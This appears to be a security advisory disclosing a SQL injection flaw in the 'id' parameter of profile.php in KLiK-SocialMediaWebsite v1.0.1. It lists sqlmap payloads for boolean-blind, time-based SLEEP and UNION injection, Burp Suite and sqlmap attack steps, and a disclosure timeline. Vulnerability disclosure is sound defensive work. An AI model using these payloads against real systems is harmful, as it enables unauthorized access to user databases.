# KLiK-SocialMediaWebsite version v1.0.1

### Vulnerability Explanation:
KLiK-SocialMediaWebsite v1.0.1 has SQL Injection Vulnerabilities on profile.php at parameter `id`.

### Attack Vectors:
KLiK-SocialMediaWebsite v1.0.1 Once an user has been created it can also be find people on KLiK through the KLiK Users page. The "id" parameter of the profile.php can be abused for injecting arbitrary SQL queries.

### Affected: 
- http://ip_address/KLiK/profile.php?id=user_id
- GET /KLiK/login.php

### Payload :
```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=27 AND 3227=3227

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=27 AND (SELECT 3046 FROM (SELECT(SLEEP(5)))barN)

    Type: UNION query
    Title: MySQL UNION query (NULL) - 11 columns
    Payload: id=-2373 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71787a7171,0x6d67676474624545784f564265735871415865575a4f72697053686d724768624969514c70754459,0x717a707071),NULL,NULL,NULL,NULL,NULL,NULL#
```

### Tested on: 
1. KLiK SocialMediaWebsite version v1.0.1 (https://github.com/msaad1999/KLiK-SocialMediaWebsite/releases/tag/v1.0.1)

2. Firefox version 105

3. sqlmap version 1.6.7 stable

### Steps to attack:
1. Login with username and password.
2. Click the icon depicting a person in the upper right corner.
3. Intercept request by using Burp Suite.
4. Select an individual from the KLiK Users page by clicking on their name.
5. Returning to Burp Suite, at /profile.php, right-click and select "Copy to file."
6. Send the request file to Kali Linux and use sqlmap with it.
7. SQL Injection vulnerability discovered through id

### Discoverer:
:shipit: Grim The Ripper Team by SOSECURE Thailand

### Medium:
- 

### Disclosure Timeline:
- 2022–09–28: Vulnerability discovered.
- 2022–09–28: Vulnerability reported to the MITRE corporation.
- 2022–10–15: CVE has been reserved.
- 2022–10–31: Public disclosure of the vulnerability.

Reference:

1. 

2.

3. https://github.com/msaad1999/KLiK-SocialMediaWebsite/releases/tag/v1.0.1

4. https://github.com/msaad1999/KLiK-SocialMediaWebsite

